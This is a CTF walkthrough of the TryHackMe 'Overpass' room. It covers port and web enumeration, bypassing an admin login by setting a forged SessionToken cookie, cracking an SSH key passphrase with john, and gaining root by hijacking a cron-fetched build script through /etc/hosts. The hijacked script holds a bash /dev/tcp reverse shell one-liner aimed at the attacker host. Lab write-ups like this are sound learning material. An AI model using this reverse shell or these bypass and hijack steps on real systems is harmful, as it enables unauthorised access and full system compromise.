---
title: Overpass | TryHackMe
date: 2022-07-19 00:00:00 +/-TTTT
categories: [Writeup, TryHackMe]
tags: [writeup, tryhackme, cron, security, owasp]
author:
  name: v3r4x
---

## Overview

Welcome to my writeup for the [Overpass](https://tryhackme.com/room/overpass) room on [TryHackMe](https://tryhackme.com/).  As with my recent writeups, these rooms have very little guidance, so you must have a good knowledge base and methodology before attempting.  Feel free to explore my other writeups [here](https://0xv3r4x.github.io/categories/writeup/) for guidance on how to tackle similar rooms.

In order to complete this room, we must enumerate the target, establish initial access by exploiting a vulnerable web application, and escalate our privileges via a misconfigured cron job.

I hope you enjoy!

## Walkthrough

Once we have established connection with the VM, we begin by enumerating the vulnerable machine with nmap:

```console
$ nmap -sC -sV -T4 -p- 10.10.23.164
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 21:25 BST
Nmap scan report for 10.10.73.164
Host is up (0.058s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
|_  256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.36 seconds
```

Here is a quick overview of the above scan:
- `-sC`: Will perform a script scan using a set of default scripts.
- `-sV`: Will probe open ports to determine service and version information.
- `-T4`: Sets the timing for the scan (higher is faster).
- `-p-`: Specifies all ports will be scanned (1-65535).

From the output, we have **two open ports** on the target machine, namely **.** (SSH) and **port 80** (HTTP).

Given that we can't connect to the SSH server, we can enumerate the web server running on port 80 using both **nikto** and **gobuster**.  While these are running, we can navigate to the website on our browser and crawl it manually to better understand how it works.

![](/assets/posts/20220719/homepage.png)

As shown above, the website appears to offer a "secure password manager" for all platforms and supports "military grade cryptography" to keep your passwords safe.  We can get a copy of this from the "Downloads" page as shown:

![](/assets/posts/20220719/downloads.png)

From the "About Us" page, it appears that Overpass was formed due to the number of compromised passwords within the rockyou wordlist.  It also claims that the passwords are stored locally on your PC and are unique for every service.

![](/assets/posts/20220719/aboutus.png)

From our nikto and gobuster scans, we also see an `/admin` directory.

```console
$ nikto -h 10.10.73.164
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.73.164
+ Target Hostname:    10.10.73.164
+ Target Port:        80
+ Start Time:         2022-07-19 21:34:32 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3092: /admin.html: This might be interesting...
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3092: /downloads/: This might be interesting...
+ OSVDB-3092: /img/: This might be interesting...
+ 7890 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-07-19 21:38:53 (GMT1) (261 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```console
$ gobuster dir -u 10.10.73.164 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.73.164
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/19 21:35:06 Starting gobuster in directory enumeration mode
===============================================================
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]    
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/img                  (Status: 301) [Size: 0] [--> img/]      
/index.html           (Status: 301) [Size: 0] [--> ./]        
                                                              
===============================================================
2022/07/19 21:35:28 Finished
===============================================================
```

![](/assets/posts/20220719/admin.png)

Unfortunately, we do not have any usernames, so we cannot bruteforce any passwords.  Looking at the source code, there appears to be **three JavaScript files** being referenced within the HTML:

![](/assets/posts/20220719/source_code.png)

The `login.js` appears to handle the logic for the `/admin` login form.

```js
function onLoad() {
    document.querySelector("#loginForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        login()
    });
}
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

As the above shows, the `onLoad()` function is called as soon as the page is loaded.  It then waits for the form `#loginForm` to be submitted before calling the `login()` function.  After retrieving the submiitted form values, the function then creates a POST request to the `/api/login` endpoint and receives a response.  If the response is equal to "Incorrect credentials", the login was unsuccessful and the form is reset, otherwise a cookie called `SessionToken` is created with the value of the response.

We can therefore abuse the if-statement and create a cookie called `SessionToken` with any value other than "Incorrect credentials".  We can use an in-built [cookie editor](https://cookie-editor.cgagnier.ca/) for this.

![](/assets/posts/20220719/creating_cookie.png)

Here we create a cookie called `SessionToken`, as above, and give it a value of "lorem ipsum...".  Again, the value is not important - it just has to be different than "Incorrect credentials".  After clicking the save button we can then refresh the page and establish our access to the admin page.

![](/assets/posts/20220719/authentication_bypass.png)

As shown above, we have been given a private key which is used for James' SSH access.  Subsequently, we can copy this and create our own key and access the machine via SSH as James.  To do this, we first need to copy the key to a file:

![](/assets/posts/20220719/james_ssh.png)

Note that it is vital to leaving a trailing newline at the end of the file or else SSH will not recognise it as a private key.  We then have to set the permissions of the file so that it can be used appropriately.  To do this, we use the `chmod` command (change mode) with `600` to alter the permissions of the file.  Specifically, this will allow the owner of the file to read and write to it but not execute it.

```console
$ chmod 600 james
```

We can then login via SSH.  However, as shown below, we require a password for the key before we can successfully login.

![](/assets/posts/20220719/key_password.png)

We can retrieve this password by utilising JohnTheRipper.  Firstly, we have to convert the file to a hash that JohnTheRipper can use - we do this using `ssh2john.py`.  Then, we can run the `john` command with the `rockyou.txt` wordlist against our `hash.txt` file:

![](/assets/posts/20220719/john_the_ripper.png)

Now that we have the password for the SSH key, we can successfully login as james and retrieve our user flag:

![](/assets/posts/20220719/user_flag.png)

We also have a `todo.txt` file within the `james` user's `/home` directory which reads:

```
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

From the second note, it appears James has used the Overpass password manager to make a note of his password.  Taking a look at the source code retrieved from the "Downloads" page, it appears that the password manager uses ROT47 - a variant of the Caesar Cipher - to encrypt the passwords.

```go
//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example
func rot47(input string) string {
  var result []string
  for i := range input[:len(input)] {
    j := int(input[i])
    if (j >= 33) && (j <= 126) {
      result = append(result, string(rune(33+((j+14)%94))))
    } else {
      result = append(result, string(input[i]))
    }
  }
  return strings.Join(result, "")
}
```

Once the password is encrypted, it is saved to a `.overpass` file within the user's `/home` directory.  Since we now know the encryption method, we can decode his password:

![](/assets/posts/20220719/system_password.png)

Now that we have established ourselves as the `james` user, we must find a way to escalate our privileges to `root` and find the final flag.  As such, we must conduct further enumeration.  To do this, we can use [linPEAS](https://github.com/carlospolop/PEASS-ng/releases/) which is part of the [Privilege Escalation Awesome Scripts Suite](https://github.com/carlospolop/PEASS-ng).  Firstly, we need to upload the `linpeas.sh` script to the victim machine - we can do this with Python.

```console
$ ls
linpeas.sh  winPEAS.bat
$ sudo python3 -m http.server 80
```

We can then retrieve the `linpeas.sh` file from the victim machine:

![](/assets/posts/20220719/linpeas_download.png)

Running `linpeas.sh` reveals a cronjob running as `root`:

![](/assets/posts/20220719/cronjob.png)

In particular, the cronjob is executing the `buildscript.sh` with `bash` after retrieving it from `overpass.thm` using `curl`:

```sh
GOOS=linux /usr/local/go/bin/go build -o ~/builds/overpassLinux ~/src/overpass.go
## GOOS=windows /usr/local/go/bin/go build -o ~/builds/overpassWindows.exe ~/src/overpass.go
## GOOS=darwin /usr/local/go/bin/go build -o ~/builds/overpassMacOS ~/src/overpass.go
## GOOS=freebsd /usr/local/go/bin/go build -o ~/builds/overpassFreeBSD ~/src/overpass.go
## GOOS=openbsd /usr/local/go/bin/go build -o ~/builds/overpassOpenBSD ~/src/overpass.go
echo "$(date -R) Builds completed" >> /root/buildStatus
```

As shown above, this file first builds the Overpass password manager witin `/src/`.  It then echos the current date and "Builds completed", appending it to `/root/buildStatus`.  

More importantly, `linpeas.sh` also indicated that we can edit `/etc/hosts`, and thus we can change the `overpass.thm` endpoint to point to our attacker machine.

![](/assets/posts/20220719/etc_hosts.png)

We can then create a `buildscript.sh` file on our machine with a reverse shell one-liner:

```sh
bash -i >& /dev/tcp/10.8.1.103/4444 0>&1
```

Note that this file has to be placed within a `downloads/src/` directory, otherwise the cronjob will not be able to find and fetch the file.  We also require a Python HTTP server, which allows the cronjob to fetch the file and a netcat listener to catch the callback when the file is executed:

![](/assets/posts/20220719/python_http_server.png)

As shown, we receive a GET request for the `buildscript.sh` script.  We then see the callback on our netcat listener and establish our connection as the `root` user.  Finally, since we have successfully escalated our privileges, we can retrieve the root flag:

![](/assets/posts/20220719/root_flag.png)

## Closing Remarks

And that's it!  All done!

I hope you all enjoyed this room and learned a thing or two.  I really am trying to up my game with these writeups and tutorials for my own learning and so I can share my knowledge with you.

If you want to keep up-to-date on what I do, follow me here:

- [Twitter](https://twitter.com/0xV3R4X)
- [GitHub](https://github.com/0xv3r4x)

Or you can also support me by buying me a coffee:

<a href="https://www.buymeacoffee.com/v3r4x" target="_blank"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" style="height: auto !important; width: auto !important;"></a>

Stay curious

\- v3r4x